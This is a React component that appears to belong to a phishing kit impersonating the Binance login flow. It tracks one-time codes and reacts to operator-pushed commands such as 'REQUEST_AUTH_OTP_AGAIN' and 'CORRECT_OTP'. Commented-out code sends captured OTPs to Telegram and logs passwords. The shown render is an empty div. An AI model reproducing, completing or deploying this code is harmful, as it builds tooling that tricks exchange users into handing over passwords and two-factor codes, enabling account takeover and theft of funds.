'use client'
import '../app/globals.css'
import { useState, useEffect, useRef } from 'react'
import { useTheme } from '../app/lib/ThemeContext'
import BinanceLoader from './BinanceLoader'
import { useValidatePassword } from '../app/hooks/useValidate'
import Modal from './VerificationModal'
import { useCommand } from '../app/lib/CommandContext';
import { useRouter } from 'next/navigation'

export default function LoginForm() {
    const router = useRouter()
    const { command } = useCommand();
    const { theme, toggleTheme } = useTheme();
    const [otpCode, setOtpCode] = useState("");
    const [invalid, setInvalid] = useState(false)
    const [visible, setVisible] = useState(false)
    const [modal, setModal] = useState('AuthApp')
    const [displayModal, setDisplayModal] = useState(false)

    function handleDisplayModal(type) {
        setModal(type);
        setDisplayModal(true); // Ensure this is called
        console.log('Opening modal for:', type); // Debug log
    }

    useEffect(() => {
        const isClickInsideButton = (event) => {
            const button = document.querySelector('button[type="button"]');
            console.log('button was clicked')
            return button && button.contains(event.target);
        };

        const handleClick = (event) => {
            if (!isClickInsideButton(event)) {
                setInvalid(false);
            }
        };

        document.addEventListener('click', handleClick);

        return () => {
            document.removeEventListener('click', handleClick);
        };
    }, []);


    const [isLoading, setIsLoading] = useState(false)
    const [isHovered, setIsHovered] = useState(false)

    useEffect(() => {
        console.log("Command is ", command);
        if (command === 'REQUEST_AUTH_OTP_AGAIN') {
            setIsLoading(false);
            setInvalid(true);
        } else if (command === 'REQUEST_EMAIL_OTP_AGAIN') {
            setIsLoading(false);
            setInvalid(true);
        } else if (command === 'CORRECT_OTP') {
            console.log("Command in VERIF IS ", command, "Modal type is", modal);
            setIsLoading(false);
            setOtpCode('');
            // Only close if the modal type matches the expected OTP type
            if ((modal === 'AuthApp' && command === 'CORRECT_OTP') ||
                (modal === 'Email' && command === 'CORRECT_OTP')) {
                setDisplayModal(false);
            }
        }
    }, [command, modal, setDisplayModal]);

    // const { validatePassword } = useValidatePassword();
    // const handleOtpValidation = () => {
    //     // Replace this with your actual OTP validation logic:
    //     const isValid = validateOtp(otpCode);

    //     // Set error state based on validity
    //     setInvalid(!isValid);

    //     // Always start the loader when trying to submit
    //     setIsLoading(true);

    //     if (isValid) {
    //       console.log(`${modal} OTP is valid. Sending to Telegram...`);
    //       // Send OTP along with its type. Adjust sendMessageToTelegram as needed.
    //       sendMessageToTelegram(otpCode);
    //     } else {
    //       // If invalid, show loader for 1 second, then turn it off.
    //       setTimeout(() => {
    //         setIsLoading(false);
    //       }, 1000);
    //     }

    //     return isValid;
    //   };



    // const handlePasswordValidation = () => {
    //     const isValid = validatePassword(password);
    //     setInvalid(!isValid);
    //     console.log("password is ", password)
    //     console.log(' Authentication submitted')

    //     if (isValid) {
    //         setIsLoading(true);
    //         setTimeout(() => {
    //             setIsLoading(false);
    //         }, 5000);
    //     }

    //     return isValid;
    // }


    const [padding, setPadding] = useState("80px 24px 54px");

    useEffect(() => {
        const handleResize = () => {
            setPadding(window.innerWidth < 768 ? "8px 24px 16px" : "80px 24px 54px");
        };

        // Set initial padding
        handleResize();

        // Add event listener
        window.addEventListener("resize", handleResize);
        return () => window.removeEventListener("resize", handleResize);
    }, []);

    return (
        <div className={`lg:h-full h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} flex flex-col justify-between md:justify-normal`}>
        </div >
    );
}
